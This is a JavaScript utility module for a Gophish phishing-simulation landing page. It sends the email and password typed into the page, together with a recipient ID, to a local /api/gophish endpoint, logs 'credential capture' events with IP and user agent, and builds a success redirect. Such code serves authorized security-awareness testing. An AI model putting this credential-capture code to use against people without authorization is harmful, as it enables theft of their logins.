/**
 * Utility functions for Gophish integration
 */

/**
 * Send credentials to Gophish
 * @param {Object} credentials - User credentials
 * @param {string} credentials.email - User email
 * @param {string} credentials.password - User password
 * @param {string} rid - Recipient ID from Gophish
 * @returns {Promise<Object>} Response from Gophish
 */
export async function sendToGophish(credentials, rid) {
  try {
    const response = await fetch('/api/gophish', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: credentials.email,
        password: credentials.password,
        rid: rid
      }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error('Error sending to Gophish:', error);
    throw error;
  }
}

/**
 * Extract RID from URL parameters
 * @param {string} url - Current URL
 * @returns {string|null} RID parameter value
 */
export function extractRidFromUrl(url) {
  try {
    const urlObj = new URL(url);
    return urlObj.searchParams.get('rid');
  } catch (error) {
    console.error('Error extracting RID from URL:', error);
    return null;
  }
}

/**
 * Validate RID format (basic validation)
 * @param {string} rid - Recipient ID to validate
 * @returns {boolean} True if valid format
 */
export function validateRid(rid) {
  if (!rid || typeof rid !== 'string') {
    return false;
  }
  
  // Basic validation - RID should be alphanumeric and reasonable length
  const ridRegex = /^[a-zA-Z0-9_-]{1,50}$/;
  return ridRegex.test(rid);
}

/**
 * Log credential capture event
 * @param {Object} data - Event data
 * @param {string} data.email - User email
 * @param {string} data.rid - Recipient ID
 * @param {string} data.userAgent - Browser user agent
 * @param {string} data.ip - User IP address
 */
export function logCredentialCapture(data) {
  const logData = {
    timestamp: new Date().toISOString(),
    event: 'credential_capture',
    email: data.email,
    rid: data.rid,
    userAgent: data.userAgent,
    ip: data.ip,
    success: true
  };

  console.log('Credential Capture Event:', logData);
  
  // In production, you might want to send this to a logging service
  // or store it in a database
}

/**
 * Generate success redirect URL
 * @param {string} rid - Recipient ID
 * @param {string} baseUrl - Base URL for the application
 * @returns {string} Success page URL
 */
export function generateSuccessUrl(rid, baseUrl = '') {
  const successPath = '/success';
  const params = rid ? `?rid=${encodeURIComponent(rid)}` : '';
  return `${baseUrl}${successPath}${params}`;
} 